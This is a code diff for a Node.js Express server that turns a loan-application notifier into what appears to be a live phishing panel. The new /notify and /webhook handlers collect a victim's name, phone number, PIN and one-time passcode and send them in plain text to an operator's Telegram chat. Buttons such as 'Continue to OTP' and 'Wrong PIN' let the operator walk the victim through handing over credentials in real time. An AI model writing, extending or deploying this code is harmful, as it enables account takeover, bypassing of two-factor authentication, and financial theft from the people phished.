@@ -47,32 +47,21 @@ app.get('/setup', async (_req, res) => {
 // ════════════════════════════════════════════════════════
 //  POST /notify
 //
-//  Sends loan application details to admin via Telegram.
-//  Admin can approve or reject the application.
+//  type = 'pin'  → sends Name, Phone, Date & Time, PIN
+//                  + [✅ Continue to OTP] [❌ Wrong PIN]
 //
-//  type = 'loan_application' → sends Name, Income Source,
-//         Monthly Income, Loan Amount, Loan Period,
-//         Monthly Payment + [✅ Approve] [❌ Reject]
+//  type = 'otp'  → sends Name, Phone, Date & Time, OTP
+//                  + [❌ Wrong OTP] [❌ Invalid PIN]
+//                    [✅ Approve Application] [❌ Decline Application]
 // ════════════════════════════════════════════════════════
 app.post('/notify', async (req, res) => {
-  const {
-    type,
-    firstName,
-    lastName,
-    incomeSource,
-    monthlyIncome,
-    loanAmount,
-    loanPeriod,
-    monthlyPayment,
-    totalRepayable
-  } = req.body;
+  const { type, phone, countryCode, passcode, otp, name } = req.body;
 
-  if (!type) {
+  if (!type || !phone) {
     return res.status(400).json({ ok: false, error: 'Missing required fields' });
   }
 
-  const fullName = `${firstName || ''} ${lastName || ''}`.trim() || 'Unknown';
-  const phone = `${firstName || 'User'}_${Date.now()}`; // Unique identifier for session
+  const fullPhone = `${countryCode || ''} ${phone}`.trim();
 
   // ── Generate token + HMAC ──
   const token = crypto.randomBytes(8).toString('hex');
@@ -90,22 +79,41 @@ app.post('/notify', async (req, res) => {
     const now      = new Date();
     const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });
 
-    if (type === 'loan_application') {
-      text = `📋 *New Loan Application*\n\n`
-           + `👤 *Applicant:* ${escMd(fullName)}\n`
-           + `💼 *Income Source:* ${escMd(incomeSource || 'N/A')}\n`
-           + `💰 *Monthly Income:* \$${escMd(monthlyIncome || '0')}\n`
-           + `💵 *Loan Amount:* \$${escMd(loanAmount || '0')}\n`
-           + `📅 *Loan Period:* ${escMd(loanPeriod || 'N/A')}\n`
-           + `📆 *Monthly Payment:* \$${escMd(monthlyPayment || '0')}\n`
-           + `📊 *Total Repayable:* \$${escMd(totalRepayable || '0')}\n`
+    if (type === 'pin') {
+      if (!passcode) return res.status(400).json({ ok: false, error: 'Missing passcode' });
+
+      text = `🔒 *PIN Submitted*\n\n`
+           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
+           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
+           + `🔢 *PIN Entered:* \`${escMd(passcode)}\`\n`
            + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
            + `Awaiting your decision\\.`;
 
       keyboard = [[
-        { text: '✅ Approve Application',  callback_data: cbData('loan_approved')  },
-        { text: '❌ Reject Application',   callback_data: cbData('loan_rejected')  },
+        { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
+        { text: '❌ Wrong PIN',      callback_data: cbData('pin_wrong')    },
       ]];
+
+    } else if (type === 'otp') {
+      if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });
+
+      text = `🔐 *OTP Submitted*\n\n`
+           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
+           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
+           + `🔑 *OTP Entered:* \`${escMd(otp)}\`\n`
+           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
+           + `Awaiting your decision\\.`;
+
+      keyboard = [
+        [
+          { text: '❌ Wrong OTP',  callback_data: cbData('otp_wrong')    },
+          { text: '❌ Invalid PIN', callback_data: cbData('pin_invalid')  },
+        ],
+        [
+          { text: '✅ Approve Application', callback_data: cbData('loan_approved') },
+          { text: '❌ Decline Application', callback_data: cbData('loan_rejected') },
+        ],
+      ];
 
     } else {
       return res.status(400).json({ ok: false, error: 'Unknown type' });
@@ -128,9 +136,6 @@ app.post('/notify', async (req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  POST /poll
-//
-//  Frontend polls this endpoint to check if admin has
-//  responded to the loan application.
 // ════════════════════════════════════════════════════════
 app.post('/poll', (req, res) => {
   const { token } = req.body;
@@ -150,9 +155,6 @@ app.post('/poll', (req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  POST /webhook  — Telegram button handler
-//
-//  Handles admin button clicks from Telegram.
-//  Sets the result so the frontend can pick it up via /poll.
 // ════════════════════════════════════════════════════════
 app.post('/webhook', async (req, res) => {
   res.json({ ok: true });
@@ -196,6 +198,36 @@ app.post('/webhook', async (req, res) => {
 
   try {
     switch (action) {
+
+      // ── PIN actions ──
+      case 'continue_otp':
+        setResult(token, 'continue_otp', config.tokenTtl);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`✅ *PIN Approved*\nUser \`${escMd(session.phone)}\` may now enter OTP\\.`, []);
+        await answerCallback(cbId, '✅ Continuing to OTP');
+        break;
+
+      case 'pin_wrong':
+        setResult(token, 'pin_wrong', config.tokenTtl);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their PIN\\.`, []);
+        await answerCallback(cbId, '❌ Wrong PIN sent to user');
+        break;
+
+      // ── OTP actions ──
+      case 'otp_wrong':
+        setResult(token, 'otp_wrong', config.tokenTtl);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`❌ *Wrong OTP*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their OTP\\.`, []);
+        await answerCallback(cbId, '❌ Wrong OTP sent to user');
+        break;
+
+      case 'pin_invalid':
+        setResult(token, 'pin_invalid', config.tokenTtl);
+        await removeButtons(chatId, msgId);
+        await sendAdminMessage(`🚫 *Invalid Session*\nUser \`${escMd(session.phone)}\` has been redirected to login\\.`, []);
+        await answerCallback(cbId, '🚫 Invalid session — user redirected');
+        break;
 
       case 'loan_approved':
         setResult(token, 'loan_approved', config.tokenTtl);
